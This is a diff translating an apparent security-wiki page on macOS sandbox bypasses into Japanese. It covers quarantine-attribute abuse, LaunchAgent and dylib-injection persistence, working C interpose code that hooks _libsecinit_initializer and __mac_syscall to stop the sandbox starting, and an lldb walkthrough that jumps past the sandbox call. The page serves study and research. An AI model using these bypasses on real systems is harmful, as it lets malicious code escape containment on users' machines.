@@ -6,29 +6,29 @@
 
 <figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-In the previous image it's possible to observe **how the sandbox will be loaded** when an application with the entitlement **`com.apple.security.app-sandbox`** is run.
+前の画像では、**アプリケーションが権限** **`com.apple.security.app-sandbox`** を持っているときに、**サンドボックスがどのようにロードされるか**を観察できます。
 
-The compiler will link `/usr/lib/libSystem.B.dylib` to the binary.
+コンパイラは `/usr/lib/libSystem.B.dylib` をバイナリにリンクします。
 
-Then, **`libSystem.B`** will be calling other several functions until the **`xpc_pipe_routine`** sends the entitlements of the app to **`securityd`**. Securityd checks if the process should be quarantine inside the Sandbox, and if so, it will be quarentine.\
-Finally, the sandbox will be activated will a call to **`__sandbox_ms`** which will call **`__mac_syscall`**.
+次に、**`libSystem.B`** は他のいくつかの関数を呼び出し、**`xpc_pipe_routine`** がアプリの権限を **`securityd`** に送信します。Securitydはプロセスがサンドボックス内で隔離されるべきかどうかを確認し、そうであれば隔離します。\
+最後に、サンドボックスは **`__sandbox_ms`** への呼び出しでアクティブ化され、これが **`__mac_syscall`** を呼び出します。
 
 ## Possible Bypasses
 
 ### Bypassing quarantine attribute
 
-**Files created by sandboxed processes** are appended the **quarantine attribute** to prevent sandbox escaped. However, if you manage to **create an `.app` folder without the quarantine attribute** within a sandboxed application, you could make the app bundle binary point to **`/bin/bash`** and add some env variables in the **plist** to abuse **`open`** to **launch the new app unsandboxed**.
+**サンドボックス化されたプロセスによって作成されたファイル**には、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。しかし、もしあなたが**隔離属性なしで `.app` フォルダを作成することができれば**、アプリバンドルのバイナリを **`/bin/bash`** にポイントさせ、**plist** にいくつかの環境変数を追加して **`open`** を悪用し、**新しいアプリをサンドボックスなしで起動**することができます。
 
-This is what was done in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
+これは [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)** で行われました。**
 
 > [!CAUTION]
-> Therefore, at the moment, if you are just capable of creating a folder with a name ending in **`.app`** without a quarantine attribute, you can scape the sandbox because macOS only **checks** the **quarantine** attribute in the **`.app` folder** and in the **main executable** (and we will point the main executable to **`/bin/bash`**).
+> したがって、現時点では、**隔離属性なしで `.app` で終わる名前のフォルダを作成することができる**場合、サンドボックスから脱出できます。なぜなら、macOSは**`.app` フォルダ**と**メイン実行可能ファイル**の**隔離**属性のみを**チェック**するからです（そして、私たちはメイン実行可能ファイルを **`/bin/bash`** にポイントさせます）。
 >
-> Note that if an .app bundle has already been authorized to run (it has a quarantine xttr with the authorized to run flag on), you could also abuse it... except that now you cannot write inside **`.app`** bundles unless you have some privileged TCC perms (which you won't have inside a sandbox high).
+> すでに実行を許可された .app バンドルがある場合（実行を許可されたフラグが付いた隔離 xttr がある場合）、それを悪用することもできます... ただし、今はサンドボックス内では特権 TCC 権限がない限り、**.app** バンドル内に書き込むことはできません。
 
 ### Abusing Open functionality
 
-In the [**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) can be appreciated how the **`open`** cli functionality could be abused to bypass the sandbox.
+[**Word サンドボックスバイパスの最後の例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)では、**`open`** CLI 機能がサンドボックスをバイパスするために悪用される様子が確認できます。
 
 {{#ref}}
 macos-office-sandbox-bypasses.md
@@ -36,16 +36,16 @@ macos-office-sandbox-bypasses.md
 
 ### Launch Agents/Daemons
 
-Even if an application is **meant to be sandboxed** (`com.apple.security.app-sandbox`), it's possible to make bypass the sandbox if it's **executed from a LaunchAgent** (`~/Library/LaunchAgents`) for example.\
-As explained in [**this post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), if you want to gain persistence with an application that is sandboxed you could make be automatically executed as a LaunchAgent and maybe inject malicious code via DyLib environment variables.
+アプリケーションが**サンドボックス化されることを意図している** (`com.apple.security.app-sandbox`)場合でも、例えば**LaunchAgent** (`~/Library/LaunchAgents`) から実行されるとサンドボックスをバイパスすることが可能です。\
+[**この投稿**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)で説明されているように、サンドボックス化されたアプリケーションで永続性を得たい場合、LaunchAgent として自動的に実行されるようにし、DyLib 環境変数を介して悪意のあるコードを注入することができます。
 
 ### Abusing Auto Start Locations
 
-If a sandboxed process can **write** in a place where **later an unsandboxed application is going to run the binary**, it will be able to **escape just by placing** there the binary. A good example of this kind of locations are `~/Library/LaunchAgents` or `/System/Library/LaunchDaemons`.
+サンドボックス化されたプロセスが**後でサンドボックスなしで実行されるアプリケーションがバイナリを実行する場所に**書き込むことができれば、**そこにバイナリを置くだけで脱出**できます。この種の場所の良い例は `~/Library/LaunchAgents` や `/System/Library/LaunchDaemons` です。
 
-For this you might even need **2 steps**: To make a process with a **more permissive sandbox** (`file-read*`, `file-write*`) execute your code which will actually write in a place where it will be **executed unsandboxed**.
+これには**2ステップ**が必要な場合があります：**より許可されたサンドボックス** (`file-read*`, `file-write*`) を持つプロセスを実行して、実際に**サンドボックスなしで実行される場所に書き込む**コードを実行します。
 
-Check this page about **Auto Start locations**:
+**Auto Start locations**についてはこのページを確認してください：
 
 {{#ref}}
 ../../../../macos-auto-start-locations.md
@@ -53,7 +53,7 @@ Check this page about **Auto Start locations**:
 
 ### Abusing other processes
 
-If from then sandbox process you are able to **compromise other processes** running in less restrictive sandboxes (or none), you will be able to escape to their sandboxes:
+サンドボックスプロセスから、**制限の少ない（または全くない）他のプロセスを妥協することができれば**、それらのサンドボックスに脱出することができます：
 
 {{#ref}}
 ../../../macos-proces-abuse/
@@ -61,44 +61,39 @@ If from then sandbox process you are able to **compromise other processes** runn
 
 ### Static Compiling & Dynamically linking
 
-[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
+[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、サンドボックスをバイパスする2つの方法が発見されました。サンドボックスはユーザーランドから適用されるため、**libSystem** ライブラリがロードされるときに、バイナリがそれを回避できれば、サンドボックス化されることはありません：
 
-- If the binary was **completely statically compiled**, it could avoid loading that library.
-- If the **binary wouldn't need to load any libraries** (because the linker is also in libSystem), it won't need to load libSystem.
+- バイナリが**完全に静的にコンパイルされている**場合、そのライブラリをロードすることを回避できます。
+- **バイナリがライブラリをロードする必要がない**場合（リンカーも libSystem にあるため）、libSystem をロードする必要はありません。
 
 ### Shellcodes
 
-Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
-
+**シェルコード**でさえ、ARM64 では `libSystem.dylib` にリンクする必要があることに注意してください：
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-
 ### Entitlements
 
-Note that even if some **actions** might be **allowed by at he sandbox** if an application has an specific **entitlement**, like in:
-
+特定の**権限**を持つアプリケーションの場合、いくつかの**アクション**が**サンドボックスによって許可される**可能性があることに注意してください。
 ```scheme
 (when (entitlement "com.apple.security.network.client")
-      (allow network-outbound (remote ip))
-      (allow mach-lookup
-             (global-name "com.apple.airportd")
-             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
-             (global-name "com.apple.cfnetwork.cfnetworkagent")
-             [...]
+(allow network-outbound (remote ip))
+(allow mach-lookup
+(global-name "com.apple.airportd")
+(global-name "com.apple.cfnetwork.AuthBrokerAgent")
+(global-name "com.apple.cfnetwork.cfnetworkagent")
+[...]
 ```
+### インターポスティングバイパス
 
-### Interposting Bypass
-
-For more information about **Interposting** check:
+**インターポスティング**に関する詳細は以下を参照してください:
 
 {{#ref}}
 ../../../macos-proces-abuse/macos-function-hooking.md
 {{#endref}}
 
-#### Interpost `_libsecinit_initializer` to prevent the sandbox
-
+#### サンドボックスを防ぐために `_libsecinit_initializer` をインターポストする
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -107,12 +102,12 @@ For more information about **Interposting** check:
 void _libsecinit_initializer(void);
 
 void overriden__libsecinit_initializer(void) {
-    printf("_libsecinit_initializer called\n");
+printf("_libsecinit_initializer called\n");
 }
 
 __attribute__((used, section("__DATA,__interpose"))) static struct {
-	void (*overriden__libsecinit_initializer)(void);
-	void (*_libsecinit_initializer)(void);
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
 }
 _libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
 ```
@@ -122,9 +117,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-
-#### Interpost `__mac_syscall` to prevent the Sandbox
-
+#### インターポスト `__mac_syscall` でサンドボックスを防ぐ
 ```c:interpose.c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -136,24 +129,24 @@ int __mac_syscall(const char *_policyname, int _call, void *_arg);
 
 // Replacement function
 int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-        printf("Bypassing Sandbox initiation.\n");
-        return 0; // pretend we did the job without actually calling __mac_syscall
-    }
-    // Call the original function for other cases
-    return __mac_syscall(_policyname, _call, _arg);
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
 }
 
 // Interpose Definition
 struct interpose_sym {
-    const void *replacement;
-    const void *original;
+const void *replacement;
+const void *original;
 };
 
 // Interpose __mac_syscall with my_mac_syscall
 __attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
 };
 ```
 
@@ -168,25 +161,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+### lldbを使用したSandboxのデバッグとバイパス
 
-### Debug & bypass Sandbox with lldb
-
-Let's compile an application that should be sandboxed:
+サンドボックス化されるべきアプリケーションをコンパイルしましょう：
 
 {{#tabs}}
 {{#tab name="sand.c"}}
-
 ```c
 #include <stdlib.h>
 int main() {
-    system("cat ~/Desktop/del.txt");
+system("cat ~/Desktop/del.txt");
 }
 ```
-
 {{#endtab}}
 
 {{#tab name="entitlements.xml"}}
-
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -195,27 +184,23 @@ int main() {
 </dict>
 </plist>
 ```
-
 {{#endtab}}
 
 {{#tab name="Info.plist"}}
-
 ```xml
 <plist version="1.0">
 <dict>
-    <key>CFBundleIdentifier</key>
-    <string>xyz.hacktricks.sandbox</string>
-    <key>CFBundleName</key>
-    <string>Sandbox</string>
+<key>CFBundleIdentifier</key>
+<string>xyz.hacktricks.sandbox</string>
+<key>CFBundleName</key>
+<string>Sandbox</string>
 </dict>
 </plist>
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-Then compile the app:
-
+次にアプリをコンパイルします：
 ```bash
 # Compile it
 gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand
@@ -225,17 +210,15 @@ gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.pli
 # Apply the entitlements via signing
 codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
-
 > [!CAUTION]
-> The app will try to **read** the file **`~/Desktop/del.txt`**, which the **Sandbox won't allow**.\
-> Create a file in there as once the Sandbox is bypassed, it will be able to read it:
+> アプリは **`~/Desktop/del.txt`** ファイルを**読み取ろうとしますが**、**Sandboxはそれを許可しません**。\
+> Sandboxがバイパスされると読み取れるように、そこにファイルを作成してください：
 >
 > ```bash
 > echo "Sandbox Bypassed" > ~/Desktop/del.txt
 > ```
 
-Let's debug the application to see when is the Sandbox loaded:
-
+アプリケーションをデバッグして、Sandboxがいつ読み込まれるかを見てみましょう：
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -251,11 +234,11 @@ lldb ./sand
 # We are looking for the one libsecinit from libSystem.B, like the following one:
 (lldb) bt
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
-    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
-    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
-    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
-    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
+* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
+frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
+frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
+frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
+frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
 
 # To avoid lldb cutting info
 (lldb) settings set target.max-string-summary-length 10000
@@ -266,7 +249,7 @@ lldb ./sand
 
 # The 3 arg is the address were the XPC response will be stored
 (lldb) register read x2
-  x2 = 0x000000016fdfd660
+x2 = 0x000000016fdfd660
 
 # Move until the end of the function
 (lldb) finish
@@ -294,12 +277,12 @@ lldb ./sand
 # Due to the previous bp, the process will be stopped in:
 Process 2517 stopped
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
+frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
 libsystem_kernel.dylib`:
 ->  0x187659900 <+0>:  mov    x16, #0x17d
-    0x187659904 <+4>:  svc    #0x80
-    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
-    0x18765990c <+12>: pacibsp
+0x187659904 <+4>:  svc    #0x80
+0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
+0x18765990c <+12>: pacibsp
 
 # To bypass jump to the b.lo address modifying some registers first
 (lldb) breakpoint delete 1 # Remove bp
@@ -312,8 +295,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-
-> [!WARNING] > **Even with the Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop
+> [!WARNING] > **サンドボックスをバイパスしても、TCC** はユーザーにデスクトップからファイルを読み取るプロセスを許可するかどうか尋ねます
 
 ## References
 
@@ -322,4 +304,3 @@ Process 2517 exited with status = 0 (0x00000000)
 - [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)
 
 {{#include ../../../../../banners/hacktricks-training.md}}
-
